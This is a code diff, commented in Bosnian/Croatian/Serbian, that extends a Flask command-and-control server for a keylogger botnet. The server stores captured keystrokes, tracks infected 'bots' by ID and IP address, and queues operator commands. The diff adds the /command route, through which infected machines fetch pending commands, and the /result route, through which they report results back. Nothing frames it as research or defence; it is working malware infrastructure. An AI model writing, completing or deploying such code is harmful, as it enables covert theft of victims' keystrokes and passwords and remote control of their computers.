@@ -38,31 +38,24 @@ cipher = Fernet(MY_KEY)
 print(f"[+] Encryption key loaded: {MY_KEY[:20]}...")
 
 # =====================================================================
-# BAZA PODATAKA - JEDNOSTAVNA IMPLEMENTACIJA
+# BAZA PODATAKA
 # =====================================================================
 DB_PATH = 'c2_database.db'
 
 def init_db():
-    """Kreiraj bazu ako ne postoji"""
     try:
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
-        
-        # Keylogs tabela
         c.execute('''CREATE TABLE IF NOT EXISTS keylogs
                      (id INTEGER PRIMARY KEY AUTOINCREMENT,
                       bot_id TEXT,
                       data TEXT,
                       timestamp TEXT)''')
-        
-        # Botovi tabela
         c.execute('''CREATE TABLE IF NOT EXISTS bots
                      (bot_id TEXT PRIMARY KEY,
                       first_seen TEXT,
                       last_seen TEXT,
                       ip_address TEXT)''')
-        
-        # Komande tabela
         c.execute('''CREATE TABLE IF NOT EXISTS commands
                      (id INTEGER PRIMARY KEY AUTOINCREMENT,
                       bot_id TEXT,
@@ -70,7 +63,6 @@ def init_db():
                       status TEXT,
                       result TEXT,
                       timestamp TEXT)''')
-        
         conn.commit()
         conn.close()
         print("[+] Database initialized successfully")
@@ -79,7 +71,6 @@ def init_db():
         print(f"[-] Database initialization error: {e}")
         return False
 
-# INICIJALIZUJ BAZU
 init_db()
 
 # =====================================================================
@@ -100,7 +91,6 @@ def require_auth(f):
 # FUNKCIJE ZA BAZU
 # =====================================================================
 def save_keylog(bot_id, data, timestamp):
-    """Sačuvaj keylog u bazu"""
     try:
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
@@ -115,7 +105,6 @@ def save_keylog(bot_id, data, timestamp):
         return False
 
 def save_bot(bot_id, timestamp, ip_address):
-    """Sačuvaj bot"""
     try:
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
@@ -130,40 +119,37 @@ def save_bot(bot_id, timestamp, ip_address):
         return False
 
 def get_all_bots():
-    """Dohvati sve botove"""
     try:
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute("SELECT bot_id, first_seen, last_seen, ip_address FROM bots")
         bots = [{"bot_id": row[0], "first_seen": row[1], "last_seen": row[2], "ip": row[3]} for row in c.fetchall()]
         conn.close()
-        print(f"[*] Returning {len(bots)} bots")
         return bots
     except Exception as e:
         print(f"[-] Error getting bots: {e}")
         return []
 
 def get_recent_logs(limit=100):
-    """Dohvati zadnje logove"""
     try:
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute("SELECT bot_id, data, timestamp FROM keylogs ORDER BY id DESC LIMIT ?", (limit,))
         logs = [{"bot": row[0], "data": row[1], "time": row[2]} for row in c.fetchall()]
         conn.close()
-        print(f"[*] Returning {len(logs)} logs")
         return logs
     except Exception as e:
         print(f"[-] Error getting logs: {e}")
         return []
 
 # =====================================================================
-# RUTE
+# RUTE - SVE RUTE!
 # =====================================================================
 @app.route('/')
 def dashboard():
     return render_template_string(DASHBOARD_TEMPLATE)
 
+# ====== RUTA ZA KEYLOG ======
 @app.route('/keylog', methods=['POST'])
 @require_auth
 def receive_keylog():
@@ -210,9 +196,69 @@ def receive_keylog():
         print(f"[-] ERROR: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
-# =====================================================================
-# API RUTE
-# =====================================================================
+# ====== RUTA ZA KOMANDE - OVO JE FALILO! ======
+@app.route('/command', methods=['GET'])
+@require_auth
+def get_command():
+    """Keylogger dohvata komande sa servera"""
+    try:
+        bot_id = request.args.get('id')
+        if not bot_id:
+            return jsonify({"status": "error", "message": "Missing bot_id"}), 400
+        
+        print(f"[*] Command request from {bot_id}")
+        
+        # Provjeri da li ima pending komandi
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("SELECT id, command FROM commands WHERE bot_id = ? AND status = 'pending' ORDER BY id ASC LIMIT 1",
+                  (bot_id,))
+        row = c.fetchone()
+        conn.close()
+        
+        if row:
+            command_id = row[0]
+            command = row[1]
+            print(f"[+] Sending command to {bot_id}: {command}")
+            return jsonify({
+                "status": "ok",
+                "command_id": command_id,
+                "command": command
+            })
+        else:
+            return jsonify({"status": "ok", "command": None})
+            
+    except Exception as e:
+        print(f"[-] Error in get_command: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+# ====== RUTA ZA REZULTAT KOMANDE ======
+@app.route('/result', methods=['POST'])
+@require_auth
+def command_result():
+    try:
+        data = request.get_json()
+        command_id = data.get('command_id')
+        result = data.get('result')
+        status = data.get('status', 'completed')
+        
+        if not command_id:
+            return jsonify({"status": "error", "message": "Missing command_id"}), 400
+        
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("UPDATE commands SET status = ?, result = ? WHERE id = ?", (status, result, command_id))
+        conn.commit()
+        conn.close()
+        
+        print(f"[+] Command {command_id} completed with status: {status}")
+        return jsonify({"status": "ok"})
+        
+    except Exception as e:
+        print(f"[-] Error in command_result: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+# ====== API RUTE ======
 @app.route('/api/bots', methods=['GET'])
 def api_bots():
     print("[*] API /bots called")
@@ -266,13 +312,15 @@ def api_send_command():
         command_id = c.lastrowid
         conn.close()
         
+        print(f"[+] Command sent to {bot_id}: {command}")
         return jsonify({"status": "ok", "command_id": command_id})
+        
     except Exception as e:
         print(f"[-] Error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 # =====================================================================
-# DASHBOARD TEMPLATE
+# DASHBOARD TEMPLATE (isti kao prije)
 # =====================================================================
 DASHBOARD_TEMPLATE = """
 <!DOCTYPE html>
